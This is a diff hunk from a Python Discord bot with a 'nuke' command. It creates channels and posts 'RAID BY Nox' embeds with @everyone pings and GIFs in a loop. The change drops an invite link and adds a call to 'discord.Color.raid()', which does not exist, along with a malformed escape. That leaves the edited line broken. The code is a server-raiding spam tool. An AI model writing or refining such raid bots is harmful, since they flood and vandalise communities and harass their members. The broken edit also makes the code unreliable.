@@ -56,7 +56,7 @@ async def nuke(ctx):
                 print(f"Salon créé : {channel.name}")
 
                 # Choisir un GIF au hasard dans la liste
-                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone", color=discord.Color.red())
+                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\@everyone", color=discord.Color.raid())
                 embed.set_image(url=gifs[_ % len(gifs)])  # Sélectionner un GIF en fonction de l'index
                 
                 for _ in range(5):
